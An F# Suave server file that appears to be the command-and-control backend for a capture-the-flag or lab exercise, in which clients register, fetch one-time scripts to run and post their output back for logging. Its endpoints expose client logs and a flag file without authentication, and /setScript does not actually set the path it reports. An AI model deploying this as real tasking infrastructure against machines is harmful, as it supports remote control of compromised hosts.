open System
open System.IO
open System.Net
open System.Collections.Concurrent
open Suave
open Suave.Filters
open Suave.Operators
open Suave.Successful
open Suave.RequestErrors
open Suave.Files

// Define the root directory to serve files from
let rootDirectory = AppDomain.CurrentDomain.BaseDirectory

// Define the base directories for scripts
let sessionScriptBaseDir = Path.Combine(rootDirectory, "scripts", "currentscript")
let debugScriptBaseDir = Path.Combine(rootDirectory, "bin", "Debug", "net8.0", "scripts", "currentscript")

// Dictionary to keep track of clients and their details
let clients = ConcurrentDictionary<string, string>()
let clientSessions = ConcurrentDictionary<string, string>()
let mutable sessionCounter = 1

let generateSessionId () =
    let sessionId = sprintf "Session%d" sessionCounter
    sessionCounter <- sessionCounter + 1
    sessionId

// Function to log received data and delete currentscript.txt
let logData (data: string) (sessionId: string) =
    try
        let logDir = Path.Combine(rootDirectory, "clients", sessionId)
        let sessionScriptPath = Path.Combine(sessionScriptBaseDir, sessionId, "currentscript.txt")
        let debugScriptPath = Path.Combine(debugScriptBaseDir, sessionId, "currentscript.txt")
        
        // Ensure the log directory exists
        if not (Directory.Exists(logDir)) then
            Directory.CreateDirectory(logDir) |> ignore
        
        // Define the log file path
        let logFile = Path.Combine(logDir, "log.txt")
        
        // Append the new data to the log file
        File.AppendAllText(logFile, $"{DateTime.Now}: {data}{Environment.NewLine}")
        
        // Check if currentscript.txt exists in the session directory and delete it
        if File.Exists(sessionScriptPath) then
            File.Delete(sessionScriptPath)
            printfn $"Deleted currentscript.txt from session directory for session {sessionId}."
        
        // Check if currentscript.txt exists in the debug directory and delete it
        if File.Exists(debugScriptPath) then
            File.Delete(debugScriptPath)
            printfn $"Deleted currentscript.txt from debug directory for session {sessionId}."
    with
    | ex -> printfn $"Error logging data or deleting script for session {sessionId}: {ex.Message}"

// Clear logs on startup
let clearLogs () =
    let logDir = Path.Combine(rootDirectory, "clients")
    if Directory.Exists(logDir) then
        Directory.EnumerateDirectories(logDir)
        |> Seq.iter (fun dir ->
            let logFile = Path.Combine(dir, "log.txt")
            if File.Exists(logFile) then File.Delete(logFile))

// Function to register a client and assign a session ID
let registerClient (clientDetails: string) =
    let clientId = clientDetails.Split('_').[0]
    let sessionId = generateSessionId()
    
    // Check if the client is already registered
    if clients.ContainsKey(clientId) then
        printfn "Client %s is already registered. Assigning new session ID: %s" clientDetails sessionId
    else
        clients.TryAdd(clientId, clientDetails) |> ignore

    clientSessions.TryAdd(sessionId, clientId) |> ignore

    // Create client directory
    let clientDir = Path.Combine(rootDirectory, "clients", sessionId)
    if not (Directory.Exists(clientDir)) then
        Directory.CreateDirectory(clientDir) |> ignore

    sessionId  // Return the new session ID

// Define the web server configuration
let config =
    { defaultConfig with
        bindings = [ HttpBinding.createSimple HTTP "0.0.0.0" 8000 ] }

// Define the web app
let app =
    choose [
        GET >=> choose [
            path "/" >=> file (Path.Combine(rootDirectory, "index.html"))
            path "/flag.txt" >=> file (Path.Combine(rootDirectory, "flag.txt"))
            path "/DefaultScript.txt" >=> file (Path.Combine(rootDirectory, "DefaultScript.txt"))
            pathScan "/clients/%s/currentScript" (fun sessionId ->
                match clientSessions.TryGetValue(sessionId) with
                | true, clientId ->
                    match clients.TryGetValue(clientId) with
                    | true, scriptPath -> 
                        let sessionScriptPath = Path.Combine(sessionScriptBaseDir, sessionId, "currentscript.txt")
                        let debugScriptPath = Path.Combine(debugScriptBaseDir, sessionId, "currentscript.txt")
                        printfn "Attempting to read and delete script at %s and %s" sessionScriptPath debugScriptPath
                        let contents = 
                            if File.Exists(sessionScriptPath) then
                                let content = File.ReadAllText(sessionScriptPath)
                                try
                                    File.Delete(sessionScriptPath)
                                    printfn "Deleted script at %s" sessionScriptPath
                                with
                                | ex -> printfn "Failed to delete script at %s: %s" sessionScriptPath ex.Message
                                content
                            else ""
                        let debugContents = 
                            if File.Exists(debugScriptPath) then
                                let content = File.ReadAllText(debugScriptPath)
                                try
                                    File.Delete(debugScriptPath)
                                    printfn "Deleted script at %s" debugScriptPath
                                with
                                | ex -> printfn "Failed to delete script at %s: %s" debugScriptPath ex.Message
                                content
                            else ""
                        if contents = "" && debugContents = "" then
                            RequestErrors.NOT_FOUND "Script not found"
                        else
                            Successful.OK (contents + debugContents) // Combine contents from both paths if any
                    | false, _ -> RequestErrors.NOT_FOUND "Client not found"
                | false, _ -> RequestErrors.NOT_FOUND "Session not found"
            )
            path "/clients" >=> request (fun _ ->
                let clientList = 
                    clientSessions
                    |> Seq.map (fun kvp -> 
                        let sessionId = kvp.Key
                        let clientDetails = clients.[kvp.Value]
                        sprintf "%s (Details: %s)" sessionId clientDetails)
                    |> String.concat ", "
                Successful.OK clientList
            )
            pathScan "/clients/%s" (fun sessionId ->
                let logDir = Path.Combine(rootDirectory, "clients", sessionId)
                let logFile = Path.Combine(logDir, "log.txt")
                if File.Exists(logFile) then
                    let logContent = File.ReadAllText(logFile)
                    Successful.OK logContent
                else
                    RequestErrors.NOT_FOUND "Log file not found"
            )
            browseHome
        ]
        POST >=> choose [
            path "/receiveOutput" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 sessionId ->
                    let data = System.Text.Encoding.UTF8.GetString(r.rawForm)
                    logData data sessionId
                    Successful.OK "Data received and logged"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/setScript" >=> request (fun r ->
                match r.queryParam "clientId" with
                | Choice1Of2 sessionId ->
                    let newScriptPath = System.Text.Encoding.UTF8.GetString(r.rawForm).Trim()
                    match clientSessions.TryGetValue(sessionId) with
                    | true, clientId ->
                        // Ensure the client's details are not overwritten by the script path
                        let updatedDetails = clients.[clientId] // Maintain existing client details
                        clients.AddOrUpdate(clientId, updatedDetails, fun _ _ -> updatedDetails) |> ignore
                        Successful.OK $"Script path set to {newScriptPath} for client {clientId}"
                    | false, _ -> RequestErrors.NOT_FOUND "Session not found"
                | Choice2Of2 _ -> RequestErrors.BAD_REQUEST "Client ID not provided"
            )
            path "/registerClient" >=> request (fun r ->
                match r.rawForm |> System.Text.Encoding.UTF8.GetString |> Option.ofObj with
                | Some clientDetails ->
                    let sessionId = registerClient(clientDetails)
                    Successful.OK sessionId
                | None -> RequestErrors.BAD_REQUEST "Client details not provided"
            )
        ]
    ]

// Start the web server and clear old logs
clearLogs ()
startWebServer config app
